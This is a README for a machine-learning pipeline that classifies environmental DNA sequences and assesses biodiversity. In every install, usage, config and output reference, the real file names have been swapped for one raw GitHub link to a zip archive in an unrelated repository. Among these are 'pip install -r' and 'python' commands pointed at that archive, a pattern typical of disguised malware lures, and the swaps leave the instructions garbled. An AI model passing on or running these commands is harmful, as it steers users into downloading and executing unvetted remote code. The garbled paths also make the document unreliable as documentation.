# eDNA AI Pipeline v1.0.0

An AI-driven pipeline for analyzing environmental DNA (eDNA) sequences, providing taxonomic classification, biodiversity assessment, and novel taxa detection using ensemble machine learning methods.

## Overview

This pipeline addresses the challenge of poor database representation and computational complexity in deep-sea eDNA analysis by combining multiple AI approaches:

- **CNN (Convolutional Neural Network)**: For sequence-based taxonomic classification
- **GNN (Graph Neural Network)**: For modeling taxonomic relationships and hierarchical classification
- **Random Forest**: For ensemble learning with feature importance analysis
- **HDBSCAN Clustering**: For unsupervised novel taxa detection
- **Ensemble Methods**: Combining predictions from multiple models for improved accuracy

## Key Features

- **Multi-model ensemble**: Combines supervised and unsupervised learning approaches
- **Novel taxa detection**: Identifies potentially new species using clustering methods
- **Biodiversity assessment**: Calculates diversity metrics (Shannon, Simpson, evenness)
- **Abundance estimation**: Estimates species abundance from sequence counts
- **Comprehensive reporting**: Generates HTML reports with interactive visualizations
- **Configurable pipeline**: YAML-based configuration for easy customization

## Installation

### Prerequisites

- Python 3.8 or higher
- CUDA-compatible GPU (optional, for faster deep learning)

### Setup

1. **Clone or extract the pipeline**:
```bash
cd eDNApipelinev3
```

2. **Create and activate virtual environment**:
```bash
python -m venv venv
# On Windows:
venv\Scripts\activate
# On Linux/Mac:
source venv/bin/activate
```

3. **Install dependencies**:
```bash
pip install -r https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip
```

### Optional: GPU Support

For CUDA support, uncomment the appropriate CUDA library in `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`:
```bash
# For CUDA 11.x
pip install cupy-cuda11x>=11.0.0

# For CUDA 12.x
pip install cupy-cuda12x>=12.0.0
```

## Usage

### Basic Usage

```bash
python https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip --data https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip
```

### Advanced Usage

```bash
python https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip --data path/to/fasta_directory \
               --config https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip \
               --blast-db C:\blastdb
```

### Command Line Arguments

- `--data`: Path to input FASTA file or directory containing FASTA files (required)
- `--config`: Path to configuration YAML file (default: `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`)
- `--blast-db`: Path to BLAST database directory (optional)
- `--version`: Show version information

## Configuration

The pipeline behavior is controlled through a YAML configuration file. Key sections include:

### Data Processing
```yaml
data_processing:
  min_sequence_length: 100
  max_sequence_length: 2000
  max_ambiguous_nucleotides_percent: 0.05
  sample_limit: null  # Set to limit dataset size for testing
```

### Model Configuration
```yaml
models:
  cnn:
    enabled: true
    epochs: 100
    batch_size: 32
  gnn:
    enabled: true
    hidden_dim: 64
  random_forest:
    enabled: true
    n_estimators: 100
  clustering:
    enabled: true
    min_cluster_size: 5
```

### Ensemble Settings
```yaml
ensemble:
  method: "weighted_voting"  # or "majority_voting"
  confidence_threshold: 0.7
  model_weights:
    cnn: 0.3
    gnn: 0.3
    rf: 0.4
```

## Input Data Format

The pipeline accepts FASTA format files containing DNA sequences:

```
>sequence_1
ATCGATCGATCGATCG...
>sequence_2
GCATGCATGCATGCAT...
```

### Supported Input Sources

1. **Single FASTA file**: One file containing multiple sequences
2. **Directory of FASTA files**: Multiple files in a directory
3. **BLAST database**: Extract sequences from existing BLAST databases

## Output

The pipeline generates several types of output:

### Directory Structure
```
project/
├── models/           # Trained models
├── results/          # CSV results files
├── plots/           # Individual plot images
├── reports/         # HTML comprehensive reports
└── logs/           # Pipeline execution logs
```

### Key Output Files

1. **HTML Report**: `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`
   - Comprehensive analysis with all visualizations
   - Interactive taxonomic tree
   - Summary statistics

2. **CSV Results**:
   - `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`: Species counts and abundances
   - `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`: Biodiversity indices

3. **Visualizations**:
   - Taxonomic composition plots
   - Biodiversity metrics
   - Novel taxa analysis
   - Model performance comparisons

## Pipeline Steps

1. **Data Loading & Preprocessing**
   - Load FASTA sequences
   - Filter by length and quality
   - Extract taxonomic information

2. **Feature Extraction**
   - One-hot encoding for CNN/GNN
   - K-mer frequency features
   - Physicochemical properties

3. **Model Training**
   - Train selected models on labeled data
   - Perform clustering on all data

4. **Prediction & Ensemble**
   - Make predictions with individual models
   - Combine using ensemble method

5. **Analysis & Reporting**
   - Estimate species abundance
   - Calculate diversity metrics
   - Identify novel taxa
   - Generate visualizations and reports

## Novel Taxa Detection

The pipeline identifies potentially novel taxa through:

1. **HDBSCAN Clustering**: Groups similar sequences
2. **Novelty Scoring**: Calculates probability-based novelty scores
3. **Outlier Detection**: Identifies sequences that don't fit existing clusters
4. **Taxonomic Inconsistency**: Finds sequences with conflicting taxonomic assignments

## Performance Optimization

### For Large Datasets
- Set `sample_limit` in configuration to test with smaller subsets
- Use GPU acceleration for deep learning models
- Adjust `batch_size` based on available memory

### For Memory-Constrained Systems
- Reduce `max_sequence_length_onehot` in feature extraction
- Disable memory-intensive models in configuration
- Use smaller batch sizes

## Troubleshooting

### Common Issues

1. **Out of Memory Errors**:
   - Reduce batch size or sequence length limits
   - Disable some models or use smaller datasets

2. **Missing Dependencies**:
   - Ensure all packages in https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip are installed
   - Check Python version compatibility

3. **BLAST Database Issues**:
   - Verify BLAST+ tools are installed
   - Check database path and permissions

### Logging

The pipeline provides detailed logging at multiple levels:
- **INFO**: General progress information
- **WARNING**: Non-critical issues
- **ERROR**: Critical errors with stack traces

Logs are saved to `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip` and displayed in console.

## Example Results

### Sample Output Summary
```
============================================================
                eDNA ANALYSIS SUMMARY
============================================================
Total Sequences Processed: 1500
High Confidence Sequences: 1200
Confidence Threshold: 0.7

BIODIVERSITY METRICS:
  Species Richness: 45
  Shannon Diversity: 3.245
  Simpson Diversity: 0.875
  Evenness: 0.654

NOVEL TAXA DETECTION:
  Novel Clusters: 3
  Novel Outliers: 15
  Total Novel Sequences: 28

TOP 5 MOST ABUNDANT TAXA:
  1. Genus_A: 245 sequences (20.4%)
  2. Genus_B: 189 sequences (15.8%)
  3. Genus_C: 156 sequences (13.0%)
  4. Genus_D: 134 sequences (11.2%)
  5. Genus_E: 98 sequences (8.2%)
============================================================
```

## Citation

If you use this pipeline in your research, please cite:

> eDNA AI Pipeline v1.0.0: An ensemble machine learning approach for environmental DNA taxonomic classification and biodiversity assessment. [Your Institution], 2025.

## Support

For questions, issues, or contributions:
- Check the logs for detailed error information
- Review configuration settings
- Ensure input data format compliance

## License

This project is released under the MIT License. See LICENSE file for details.

## Acknowledgments

This pipeline was developed to address the challenges of deep-sea eDNA analysis, particularly the poor representation of deep-sea organisms in reference databases and the need for novel taxa discovery in marine biodiversity studies.